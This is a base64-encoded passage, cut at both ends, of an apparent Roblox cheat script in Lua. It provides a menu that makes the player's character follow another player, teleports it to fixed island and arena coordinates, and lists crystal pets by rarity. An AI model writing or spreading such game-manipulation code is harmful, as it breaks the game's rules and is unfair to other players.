nM6RmluZEZpcnN0Q2hpbGQoZm9sbG93VGFyZ2V0KQogICAgICAgICAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gZm9sbG93UGxheWVyKHRhcmdldFBsYXllcikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcgoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgKG15Q2hhciBhbmQgdGFyZ2V0Q2hhcikgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlIUlAgPSBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldEhSUCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgICAgICAgICAgICAgICAgICBpZiBteUhSUCBhbmQgdGFyZ2V0SFJQIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZm9sbG93UG9zID0gdGFyZ2V0SFJQLlBvc2l0aW9uIC0gKHRhcmdldEhSUC5DRnJhbWUuTG9va1ZlY3RvciAqIDMpCiAgICAgICAgICAgICAgICAgICAgICAgIG15SFJQLkNGcmFtZSA9IENGcmFtZS5uZXcoZm9sbG93UG9zLCB0YXJnZXRIUlAuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9sbG93UGxheWVyKHRhcmdldCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgZm9sbG93aW5nID0gZmFsc2UKICAgICAgICAgICAgICAgIGZvbGxvd1RhcmdldCA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgotLSBUZWxlcG9ydCBUYWIKbG9jYWwgVGVsZXBvcnRUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJUZWxlcG9ydCIsIEljb24gPSAibWFwLXBpbiJ9KQoKLS0gSXNsYW5kcyBTZWN0aW9uClRlbGVwb3J0VGFiOlNlY3Rpb24oe1RpdGxlID0gIklzbGFuZHMifSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJTcGF3biIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIFNwYXduIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMiwgOCwgMTE1KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBTcGF3biIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIlNlY3JldCBBcmVhIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gU2VjcmV0IEFyZWEiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxOTQ3LCAyLCA2MTkxKQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBTZWNyZXQgQXJlYSIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIlRpbnkgSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gVGlueSBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMzQsIDcsIDE5MDMpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIFRpbnkgSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiRnJvemVuIElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIEZyb3plbiBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMjYwMC4wMDI0NCwgMy42NzY4NjU1OCwgLTQwMy44ODQzNjksIDAuMDg3MzYxNzAwOCwgMS4wNDgyODk5ZS0wOSwgMC45OTYxNzY2NiwgMy4wNzIwNDI1M2UtMDgsIDEsIC0zLjc0NjQwMjNlLTA5LCAtMC45OTYxNzY2NiwgMy4wOTMwMjYyOGUtMDgsIDAuMDg3MzYxNzAwOCkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gRnJvemVuIElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIk15dGhpY2FsIElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIE15dGhpY2FsIElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDIyNTUsIDcsIDEwNzEpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIE15dGhpY2FsIElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkluZmVybm8gSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gSW5mZXJubyBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtNjc2OCwgNywgLTEyODcpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEluZmVybm8gSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiTGVnZW5kIElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIExlZ2VuZCBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg0NjA0LCA5OTEsIC0zODg3KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBMZWdlbmQgSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiTXVzY2xlIEtpbmcgSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gTXVzY2xlIEtpbmcgSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTg2NDYsIDE3LCAtNTczOCkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gTXVzY2xlIEtpbmcgSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiSnVuZ2xlIElzbGFuZCIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIEp1bmdsZSBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtODY1OSwgNiwgMjM4NCkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gSnVuZ2xlIElzbGFuZCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKLS0gQnJhd2wgQXJlbmFzIFNlY3Rpb24KVGVsZXBvcnRUYWI6U2VjdGlvbih7VGl0bGUgPSAiQnJhd2wgQXJlbmFzIn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiQnJhd2wgTGF2YSIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIExhdmEgQnJhd2wgQXJlbmEiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg0NDcxLCAxMTksIC04ODM2KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBCcmF3bCBMYXZhIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiQnJhd2wgRGVzZXJ0IiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gRGVzZXJ0IEJyYXdsIEFyZW5hIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTYwLCAxNywgLTczOTgpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEJyYXdsIERlc2VydCIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkJyYXdsIFJlZ3VsYXIiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBSZWd1bGFyIEJyYXdsIEFyZW5hIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTE4NDksIDIwLCAtNjMzNSkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gQnJhd2wgUmVndWxhciIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKLS0gUGV0IFNob3AgVGFiCmxvY2FsIFBldFNob3BUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJQZXQgU2hvcCIsIEljb24gPSAic2hvcHBpbmctYmFnIn0pCgpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgcGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKLS0gQ3J5c3RhbCBkYXRhIHN0cnVjdHVyZQpsb2NhbCBjcnlzdGFsRGF0YSA9IHsKICAgIFsiQmx1ZSBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiQmx1ZSBCaXJkaWUiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJPcmFuZ2UgSGVkZ2Vob2ciLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJSZWQgS2l0dHkiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIFZhbXB5IiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBCdW5ueSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiR3JlZW4gQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlB1cnBsZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJZZWxsb3cgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9CiAgICB9LAogICAgWyJHcmVlbiBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiU2lsdmVyIERvZyIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkdyZWVuIEF1cmEiLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIEdvbGVtIiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sCiAgICAgICAge25hbWUgPSAiR3JlZW4gQnV0dGVyZmx5IiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sCiAgICAgICAge25hbWUgPSAiQ3JpbXNvbiBGYWxjb24iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiR3JlZW4gQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlB1cnBsZSBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJZZWxsb3cgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9CiAgICB9LAogICAgWyJGcm9zdCBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiWWVsbG93IEJ1dHRlcmZseSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LAogICAgICAgIHtuYW1lID0gIlB1cnBsZSBEcmFnb24iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgUGhlb25peCIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiT3JhbmdlIFBlZ2FzdXMiLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkxpZ2h0bmluZyIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiRWxlY3RybyIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9CiAgICB9LAogICAgWyJNeXRoaWNhbCBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiUHVycGxlIEZhbGNvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiUmVkIERyYWdvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBGaXJlY2FzdGVyIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJHb2xkZW4gUGhlb25peCIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiUG93ZXIgTGlnaHRuaW5nIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIExpZ2h0bmluZyIsIHJhcml0eSA9ICJFcGljIn0KICAgIH0sCiAgICBbIkluZmVybm8gQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIlJlZCBGaXJlY2FzdGVyIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJJbmZlcm5hbCBEcmFnb24iLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiV2hpdGUgUGVnYXN1cyIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiR29sZGVuIFBoZW9uaXgiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkluZmVybm8iLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgU3Rvcm0iLCByYXJpdHkgPSAiVW5pcXVlIn0KICAgIH0sCiAgICBbIkxlZ2VuZHMgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIlVsdHJhIEJpcmRpZSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJNYWdpYyBCdXR0ZXJmbHkiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiR3JlZW4gRmlyZWNhc3RlciIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiV2hpdGUgUGhlb25peCIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiU3VwZXJub3ZhIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJQdXJwbGUgTm92YSIsIHJhcml0eSA9ICJVbmlxdWUifQogICAgfSwKICAgIFsiTXVzY2xlIEVsaXRlIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJGcm9zdHdhdmUgTGVnZW5kcyBQZW5ndWluIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJQaGFudG9tIEdlbmVzaXMgRHJhZ29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIExlZ2VuZHMgTWFudGljb3JlIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJVbHRpbWF0ZSBTdXBlcm5vdmEgUGVnYXN1cyIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiQWV0aGVyIFNwaXJpdCBCdW5ueSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJDeWJlcm5ldGljIFNob3dkb3duIERyYWdvbiIsIHJhcml0eSA9ICJVbmlxdWUifQogICAgfSwKICAgIFsiR2FsYXh5IE9yYWNsZSBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiRXRlcm5hbCBTdHJpa2UgTGV2aWF0aGFuIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJMaWdodG5pbmcgU3RyaWtlIFBoYW50b20iLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkRhcmtzdGFyIEh1bnRlciIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJNdXNjbGUgS2luZyIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJBenVyZSBUdW5kcmEiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlVsdHJhIEluZmVybm8iLCByYXJpdHkgPSAiUmFyZSJ9CiAgICB9LAogICAgWyJKdW5nbGUgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIkVudHJvcGljIEJsYXN0IiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIk11c2NsZSBTZW5zZWkiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiR3JhbmQgU3VwZXJub3ZhIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJOZW9uIEd1YXJkaWFuIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkV0ZXJuYWwgTWVnYXN0cmlrZSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJHb2xkZW4gVmlraW5nIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJBc3RyYWwgRWxlY3RybyIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBFbGVjdHJvIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJFbmNoYW50ZWQgTWlyYWdlIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJVbHRyYSBNaXJhZ2UiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiVW5zdGFibGUgTWlyYWdlIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9CiAgICB9Cn0KCi0tIEZ1bmN0aW9uIHRvIGZpbmQgd2hpY2ggY3J5c3RhbCBjb250YWlucyBhIHNwZWNpZmljIHBldC9hdXJhCmxvY2